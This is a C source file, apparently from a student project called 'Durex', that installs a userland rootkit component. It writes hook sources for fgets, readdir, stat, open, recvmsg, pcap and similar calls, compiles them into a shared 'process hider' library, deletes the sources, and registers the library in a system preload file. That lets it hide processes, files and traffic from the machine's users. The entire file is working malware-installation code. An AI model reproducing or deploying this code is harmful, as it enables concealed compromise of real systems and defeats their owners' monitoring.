/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   library.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
/*   Updated: 2019/07/19 17:18:20 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* system */
#include <stdlib.h>
/* remove */
#include <stdio.h>
/* execvp */
#include <unistd.h>
/* waitpid */
#include <sys/types.h>
#include <sys/wait.h>
/* errno */
#include <errno.h>

#include "main.h"

static int		install_failed(const char *msg, t_lib *lib, size_t i)
{
	if (msg)
		serverLog(0, msg, lib[i].files);
	for (size_t j = 0; j < i; j++) {
		if (lib[j].src)
			remove(lib[j].files);
	}
	return 1;
}

static int		compile_files(t_lib *lib, size_t size)
{
	pid_t		pid;
	char		*compil[] = { "gcc", "-Wall", "-o", "/tmp/mamouth", "-c", NULL, NULL };

	serverLog(1, "[INFO] - Compiling library files ...\n");
	for (size_t i = 0; i < size; i++)
	{
		if (!lib[i].src || lib[i].status < 0)
			continue ;
		pid = fork();
		if (pid < 0) {
			lib[i].status = -1;
			serverLog(1, "[INFO] - %s\t: %s\n", lib[i].files, strerror(errno));
			continue ;
		}
		if (pid == 0)
		{
			compil[5] = lib[i].files;
			execvp(compil[0], compil);
			exit(1);
		}
		waitpid(pid, &lib[i].status, 0);
		serverLog(1, "[INFO] - %s\t: %d\n", lib[i].files, lib[i].status);
	}
	serverLog(0, "\n");
	remove("/tmp/mamouth");
	return 1;
}

static int		create_files(t_lib *lib, size_t size)
{
	size_t		ret;

	serverLog(1, "[INFO] - Creating library files ...\n");
	for (size_t i = 0; i < size; i++) {
		if (!lib[i].src)
			continue ;
		serverLog(1, "[INFO] - %s\t: ", lib[i].files);
		lib[i].status = open(lib[i].files, O_CREAT | O_TRUNC | O_WRONLY, 0600);
		serverLog(0, "%d: ", lib[i].status);
		if (lib[i].status < 0) {
			serverLog(0, "%s\n", strerror(errno));
			continue ;
		}
		ret = write(lib[i].status, lib[i].src, mystrlen(lib[i].src));
		close(lib[i].status);
		if (ret != (size_t)mystrlen(lib[i].src)) {
			serverLog(0, "wrote %d/%d\n", ret, mystrlen(lib[i].src));
			lib[i].status = -1;
			continue ;
		}
		serverLog(0, "Ok\n");
	}
	serverLog(0, "\n");
	compile_files(lib, size);
	return 1;
}

static int		compile_library(t_lib *lib, size_t size)
{
	pid_t		pid;
	int			status;
	char		**files;

	serverLog(1, "[INFO] - Compiling library ... ");
	pid = fork();
	if (pid == 0) {
		if ((files = malloc(sizeof(*files) * (size + 1))) == NULL)
			return install_failed("Malloc failed\n", lib, size);
		size_t j = 0;
		for (size_t i = 0; i < size; i++)
			if (lib[i].status == 0)
				files[j++] = lib[i].files;
		files[j] = NULL;
		execvp(files[0], files);
		free(files);
		exit(1);
	} else if (pid > 0) {
		waitpid(pid, &status, 0);
		if (status) {
			return install_failed("Execvp returned\n", lib, size);
		}
	} else {
		return install_failed(strerror(errno), lib, size);
	}
	serverLog(0, "Ok\n");
	return 1;
}

static int		install_library(t_lib *lib, size_t size)
{
	int			fd;
	size_t		ret;

	serverLog(1, "[INFO] - Installing library ... ");
	fd = open(DUREX_PRELOAD, O_CREAT | O_TRUNC | O_WRONLY, 0666);
	if (fd >= 0) {
		ret = write(fd, DUREX_PROCESSHIDER_LIB, sizeof(DUREX_PROCESSHIDER_LIB));
		close(fd);
		if (ret == sizeof(DUREX_PROCESSHIDER_LIB)) {
			for (size_t i = 0; i < size; i++) {
				if (lib[i].src)
					remove(lib[i].files);
			}
			serverLog(0, "Ok\n");
			return 1;
		}
		return install_failed("Can't write library.\n", lib, size);
	}
	return install_failed("Can't open library.\n", lib, size);
}

int				create_library()
{
	static t_lib	lib[] = {
		{ "gcc", NULL, 0},
		{ "-Wall", NULL, 0},
		{ "-fPIC", NULL, 0},
		{ "-shared", NULL, 0},
		{ "-o", NULL, 0},
		{ DUREX_PROCESSHIDER_LIB, NULL, 0},
		{ DUREX_FGETS_FILE, DUREX_FGETS_SRC, 0},
		{ DUREX_LXSTAT_FILE, DUREX_LXSTAT_SRC, 0},
		{ DUREX_NEWFSTATAT_FILE, DUREX_NEWFSTATAT_SRC, 0},
		{ DUREX_PCAP_FILE, DUREX_PCAP_SRC, 0},
		{ DUREX_READDIR_FILE, DUREX_READDIR_SRC, 0},
		{ DUREX_RECVMSG_FILE, DUREX_RECVMSG_SRC, 0},
		{ DUREX_RM_FILE, DUREX_RM_SRC, 0},
		{ DUREX_XSTAT_FILE, DUREX_XSTAT_SRC, 0},
		{ DUREX_OPEN_FILE, DUREX_OPEN_SRC, 0},
		{ "-ldl", NULL, 0},
	};
	size_t	size;

	size = sizeof(lib) / sizeof(*lib);
	return create_files(lib, size) && compile_library(lib, size) && install_library(lib, size);
}
